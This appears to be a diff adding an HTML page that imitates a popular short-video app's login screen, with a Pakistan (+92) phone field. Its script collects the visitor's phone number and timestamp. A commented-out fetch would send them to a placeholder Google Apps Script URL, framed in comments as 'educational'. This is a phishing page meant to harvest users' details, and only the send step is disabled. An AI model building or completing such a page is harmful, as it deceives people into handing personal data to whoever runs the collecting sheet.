@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #fff;
+    color: #161823;
+}
+
+.login-container {
+    width: 375px;
+    margin: 68px auto 0;
+}
+
+/* Heading */
+h1 {
+    text-align: center;
+    font-size: 32px;
+    font-weight: 700;
+    margin-bottom: 25px;
+    letter-spacing: -1px;
+}
+
+/* Top row */
+.top-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 9px;
+}
+
+.top-row span {
+    font-size: 14px;
+    font-weight: 600;
+}
+
+.email-login {
+    color: #161823;
+    cursor: pointer;
+    font-size: 12px !important;
+}
+
+/* Phone */
+.phone-box {
+    height: 46px;
+    border: 1px solid #d3d3d3;
+    background: #f8f8f8;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    margin-bottom: 9px;
+}
+
+.country {
+    height: 100%;
+    width: 105px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 16px;
+    border-right: 1px solid #ddd;
+}
+
+.arrow {
+    font-size: 12px;
+}
+
+.phone-input {
+    flex: 1;
+    border: none;
+    outline: none;
+    background: transparent;
+    height: 100%;
+    padding: 0 12px;
+    font-size: 16px;
+}
+
+.phone-input::placeholder,
+.password-input::placeholder {
+    color: #a5a5ad;
+}
+
+/* Password */
+.password-box {
+    height: 44px;
+    border: 1px solid #d3d3d3;
+    background: #f8f8f8;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.password-input {
+    flex: 1;
+    height: 100%;
+    border: none;
+    outline: none;
+    background: transparent;
+    padding: 0 12px;
+    font-size: 16px;
+}
+
+.eye {
+    width: 42px;
+    text-align: center;
+    font-size: 19px;
+    color: #8b8b8f;
+    cursor: pointer;
+}
+
+/* Links */
+.options {
+    display: flex;
+    align-items: center;
+    margin-bottom: 22px;
+}
+
+.options a {
+    color: #161823;
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 600;
+}
+
+.divider {
+    width: 1px;
+    height: 14px;
+    background: #ddd;
+    margin: 0 16px;
+}
+
+/* Login button - disabled */
+.login-btn {
+    width: 100%;
+    height: 46px;
+    border: none;
+    border-radius: 4px;
+    background: #f1f1f1;
+    color: #999;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: not-allowed;
+    transition: all 0.25s ease;
+}
+
+/* Active button (Green removed, single solid pink/red color #fe2c55 kept) */
+.login-btn.active {
+    background: #fe2c55;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 2px 8px rgba(254, 44, 85, 0.18);
+}
+
+.login-btn.active:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(254, 44, 85, 0.25);
+}
+
+/* Go back */
+.back {
+    text-align: center;
+    margin-top: 41px;
+    font-size: 14px;
+}
+
+.back a {
+    color: #161823;
+    text-decoration: none;
+    font-weight: 600;
+}
+
+.back-arrow {
+    font-size: 22px;
+    vertical-align: -2px;
+    margin-right: 5px;
+}
+
+/* Mobile */
+@media (max-width: 450px) {
+    .login-container {
+        width: calc(100% - 40px);
+        margin-top: 55px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-container">
+
+    <h1>Log in</h1>
+
+    <div class="top-row">
+        <span>Phone</span>
+        <span class="email-login">
+            Log in with email or username
+        </span>
+    </div>
+
+    <!-- Phone -->
+    <div class="phone-box">
+        <div class="country">
+            <span>PK +92</span>
+            <span class="arrow">▼</span>
+        </div>
+
+        <input
+            type="text"
+            id="phone"
+            class="phone-input"
+            placeholder="Phone number"
+            autocomplete="off"
+        >
+    </div>
+
+    <!-- Password -->
+    <div class="password-box">
+        <input
+            type="password"
+            id="password"
+            class="password-input"
+            placeholder="Password"
+            autocomplete="off"
+        >
+
+        <div class="eye" onclick="togglePassword()">
+            ◉̸
+        </div>
+    </div>
+
+    <!-- Options -->
+    <div class="options">
+        <a href="javascript:void(0)">Forgot password?</a>
+
+        <div class="divider"></div>
+
+        <a href="javascript:void(0)">Log in with code</a>
+    </div>
+
+    <!-- Login -->
+    <button
+        id="loginBtn"
+        class="login-btn"
+        type="button"
+        disabled
+    >
+        Log in
+    </button>
+
+    <!-- Back -->
+    <div class="back">
+        <a href="javascript:void(0)">
+            <span class="back-arrow">‹</span>
+            Go back
+        </a>
+    </div>
+
+</div>
+
+<script>
+
+const phone = document.getElementById("phone");
+const password = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+
+/* Enable button only when both fields contain text */
+function checkFields() {
+    if (
+        phone.value.trim() !== "" &&
+        password.value.trim() !== ""
+    ) {
+        loginBtn.classList.add("active");
+        loginBtn.disabled = false;
+    } else {
+        loginBtn.classList.remove("active");
+        loginBtn.disabled = true;
+    }
+}
+
+phone.addEventListener("input", checkFields);
+password.addEventListener("input", checkFields);
+
+/* Password show/hide */
+function togglePassword() {
+    if (password.type === "password") {
+        password.type = "text";
+    } else {
+        password.type = "password";
+    }
+}
+
+/* Handle Login Submission - Sirf Mobile Number Google Sheet ke liye bhejna */
+loginBtn.addEventListener("click", function() {
+    if (!loginBtn.disabled) {
+        const phoneValue = phone.value.trim();
+        const countryCode = "+92 ";
+
+        // Sirf mobile number aur timestamp object mein rakha hai (password exclude kar diya hai)
+        const educationalData = {
+            phoneNumber: countryCode + phoneValue,
+            timestamp: new Date().toLocaleString()
+        };
+
+        // Google Apps Script Web App URL yahan lagayen
+        /*
+        fetch('YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(educationalData)
+        }).then(() => {
+            alert('Phone number saved successfully!');
+        }).catch(error => {
+            console.error('Error:', error);
+        });
+        */
+
+        console.log("Saved Data:", educationalData);
+        alert('Phone Number: ' + educationalData.phoneNumber + ' captured for education!');
+    }
+});
+
+</script>
+
+</body>
+</html>
